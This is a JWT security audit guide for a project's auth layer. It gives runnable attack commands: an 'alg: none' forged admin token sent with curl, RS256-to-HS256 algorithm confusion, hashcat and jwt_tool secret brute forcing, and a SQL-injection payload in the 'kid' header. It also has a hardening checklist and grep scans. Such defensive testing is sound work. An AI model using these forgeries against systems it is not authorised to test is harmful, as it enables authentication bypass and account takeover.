# JWT Security Audit

Based on MITRE ATT&CK T1190, T1059.007, T1505.003 and OWASP Top 10 A02:2021.

## When to Use

- After implementing or modifying JWT authentication
- Before deployment to production
- When investigating authentication bypass reports
- During security audits of the auth layer

## Attacks to Test

### 1. Algorithm None Attack

Attempt to forge tokens by setting `alg` to `none`.

```bash
# Decode the JWT header
JWT="<token>"
echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null | jq .

# Create forged token with alg=none
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"sub":"admin","role":"admin"}' | base64 | tr -d '=' | tr '+/' '-_')
FORGED="${HEADER}.${PAYLOAD}."

# Test the forged token
curl -H "Authorization: Bearer $FORGED" https://target/api/admin
```

### 2. Algorithm Confusion (RS256 → HS256)

If server uses RS256, try signing with the public key as HMAC secret.

```bash
# Get public key from JWKS
curl -s https://target/.well-known/jwks.json | jq .

# Sign with HS256 using public key as secret
python3 -c "
import jwt
public_key = open('public_key.pem').read()
token = jwt.encode({'sub':'admin','role':'admin'}, public_key, algorithm='HS256')
print(token)
"
```

### 3. HMAC Secret Brute Force

```bash
# Hashcat mode 16500 for JWT HS256
hashcat -a 0 -m 16500 "$JWT" wordlist.txt

# Or with jwt_tool
python3 jwt_tool.py "$JWT" -C -d wordlist.txt
```

### 4. Claim Tampering

```bash
# Modify role claim
python3 jwt_tool.py "$JWT" -T -S hs256 -p "secret" -pc role -pv admin

# KID injection (SQLi in kid header)
python3 jwt_tool.py "$JWT" -I -hc kid -hv "' UNION SELECT 'attacker_secret' --" -S hs256 -p "attacker_secret"
```

### 5. Token Lifetime and Revocation

- [ ] Expired tokens are rejected
- [ ] Tokens are revoked on logout
- [ ] Tokens are revoked on password change
- [ ] Refresh token rotation is implemented

## Checklist

### Signing Configuration

- [ ] Algorithm is allowlisted server-side (reject unexpected algorithms)
- [ ] `alg: none` is rejected
- [ ] HS256 secrets are >= 256 bits
- [ ] Asymmetric algorithms (RS256/ES256) used for distributed systems
- [ ] Keys rotated periodically

### Claims Validation

- [ ] `iss` (issuer) validated
- [ ] `aud` (audience) validated
- [ ] `exp` (expiration) validated
- [ ] `nbf` (not before) validated
- [ ] `sub` (subject) validated

### Token Management

- [ ] Access tokens expire in <= 15 minutes
- [ ] Refresh tokens have longer expiry with rotation
- [ ] Token revocation implemented (blocklist or short TTL)
- [ ] Tokens not stored in localStorage

## Quick Scan

```bash
# Check JWT library and configuration
grep -rn "jwt\|jsonwebtoken\|@nestjs/jwt" apps/be/src/ --include="*.ts"

# Check for hardcoded secrets
grep -rn "secret.*=.*['\"]" apps/be/src/ --include="*.ts" | grep -i jwt

# Check token expiration settings
grep -rn "expiresIn\|expires_in\|exp" apps/be/src/ --include="*.ts"
```

## References

- Source: Anthropic-Cybersecurity-Skills `testing-jwt-token-security`, `implementing-jwt-signing-and-verification`
- OWASP: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens
